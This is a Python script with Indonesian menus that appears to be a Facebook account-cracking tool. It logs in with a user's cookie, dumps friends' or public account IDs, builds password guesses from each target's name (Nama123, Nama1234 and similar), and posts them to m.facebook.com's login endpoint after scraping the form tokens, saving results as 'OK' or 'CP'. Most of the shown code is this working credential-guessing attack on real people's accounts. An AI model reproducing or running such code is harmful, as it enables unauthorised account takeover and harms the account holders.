...
from rich.panel import Panel as brayen
from rich.panel import Panel as Brayen
...
try:
        ...
        cetak(Brayen('\t• Sedang Menginstall Modul Rich •'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(Brayen('\t• Sedang Menginstall Modul Stdiomask •'))
        os.system('pip install stdiomask')
try:
	import requests
except ImportError:
	cetak(Brayen('\t• Sedang Menginstall Modul Requests •'))
...
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	cetak(brayen(f"""[bold green]     ___  ____ ____ _   _ ____ _  _ _  _ _  _ 
[bold green]     |__] |__/ |__|  \_/  |___ |\ | |\ | |\ | 
[bold green]     |__] |  \ |  |   |   |___ | \| | \| | \|                                                                                                        
             """,width=70,padding=(0,8),title=f"Banner",style=f"bold white"))
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(Brayen('\tLogin Mengunakan Cookie Disarankan Untuk Menggunakan Akun Pribadi ',width=70,style=f"bold white"))
		ses = requests.Session()
...
def menu(my_name,my_id):
	...
	cetak(brayen(f'[bold white][[bold green]•[/][bold white]][/] [bold white]Username : [bold green]{my_name}[/]\n[bold white][[bold green]•[/][bold white]][/] [bold white]User Idz : [bold green]{my_id}[/]\n[bold white][[bold green]•[/][bold white]][/] [bold white]User Ip  : [bold green]{ip}[/][/] ',width=70,title=f"[bold green]Infomasi",style=f"bold white"))
	cetak(brayen(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Crack Publick [ ON ][/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Crack Massal [ ON ][/]\n[bold white][[bold green]03[/][bold white]][/] [bold white]Cek Result [ ON ][/]\n[bold white][[bold green]00[/][bold white]][/] [bold red]Hapus Cookies [ ON ][/]',width=70,title=f"[bold green]List Menu",style=f"bold white"))
...
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	cetak(brayen(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Hasil OK[/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Hasil CP[/]\n[bold white][[bold green]03[/][bold white]][/] [bold red]Kembali[/]',width=70,title=f"[bold white]• [/][bold green]List Menu Cek[/][bold white] •[/]",style=f"bold white"))
	kz = input(f' [+] Pilih : ')
	if kz in ['2','02']:
...
def brayen_dump():
	try:
		...
		exit()
	cetak(brayen('\t    [bold white]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=70,style='bold white'))
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	cetak(brayen(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Crack Idz Old [ Not Recommended ][/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Crack Idz New [ Very Recommended ][/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Crack Idz Random [ Recommended ][/]',width=70,title=f"[bold green]Setting Urutan Idz",style=f"bold white"))
	...
	if hu in ['1','01']:
		...
		exit()
	cetak(brayen(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Metode M.facebook.com [/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Metode Mbasic.facebook.com [/]',width=70,title=f"[bold green]Setting Metode",style=f"bold white"))
	...
	if hc in ['1','01']:
		...
		method.append('mobile')
	cetak(brayen('''[bold white][[bold green]01[bold white]] [bold white]Nama, Nama123, Nama1234 
[bold white][[bold green]02[bold white]] [bold white]Nama, Nama123, Nama1234, Nama12345 
[bold white][[bold green]03[bold white]] [bold white]Nama, Nama123, Nama1234, Nama12345 + Manual ''',style='bold white',title='[bold green]Setting Password',width=70))
...
def passwrd():
	global prog,des
	print('')
	cetak(brayen(f'\t [bold white]Proses Crack Telah Di Mulai On/Off ModePes',width=70,title=f"[bold green]Informasi",subtitle=f"[bold green]Proses Crack",style=f"bold white"))
...
def crackv1(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fmobile.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fapp_id%3D546387748750105%26auth_type%3Drerequest%26cbt%3D1676387393842%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df389af6f03d7144%2526domain%253Dbrainly.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fbrainly.co.id%25252Ffacdf68797fc%2526relation%253Dopener%26client_id%3D546387748750105%26display%3Dtouch%26domain%3Dbrainly.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fbrainly.co.id%252Fsignup%253Fentry%253D1%2526source%253Dunlogged%252Bhomepage%252Bheader%252Bbutton%26locale%3Den_US%26logger_id%3Dfde591286f57d4%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df395082859da12%2526domain%253Dbrainly.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fbrainly.co.id%25252Ffacdf68797fc%2526relation%253Dopener%2526frame%253Df2fa9e8d696f9c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Dpublic_profile%252C%2Bemail%26sdk%3Djoey%26version%3Dv3.2%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df395082859da12%26domain%3Dbrainly.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fbrainly.co.id%252Ffacdf68797fc%26relation%3Dopener%26frame%3Df2fa9e8d696f9c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=af_ZA&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login.php?skip_api_login=1&api_key=546387748750105&kid_directed_site=0&app_id=546387748750105&signed_next=1&next=https%3A%2F%2Fmobile.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fapp_id%3D546387748750105%26auth_type%3Drerequest%26cbt%3D1676387393842%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df389af6f03d7144%2526domain%253Dbrainly.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fbrainly.co.id%25252Ffacdf68797fc%2526relation%253Dopener%26client_id%3D546387748750105%26display%3Dtouch%26domain%3Dbrainly.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fbrainly.co.id%252Fsignup%253Fentry%253D1%2526source%253Dunlogged%252Bhomepage%252Bheader%252Bbutton%26locale%3Den_US%26logger_id%3Dfde591286f57d4%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df395082859da12%2526domain%253Dbrainly.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fbrainly.co.id%25252Ffacdf68797fc%2526relation%253Dopener%2526frame%253Df2fa9e8d696f9c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26scope%3Dpublic_profile%252C%2Bemail%26sdk%3Djoey%26version%3Dv3.2%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df395082859da12%26domain%3Dbrainly.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fbrainly.co.id%252Ffacdf68797fc%26relation%3Dopener%26frame%3Df2fa9e8d696f9c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=af_ZA&pl_dbl=0&refsrc=deprecated&_rdc=1&_rdr","flow":"login_no_pin","pass":pw,}
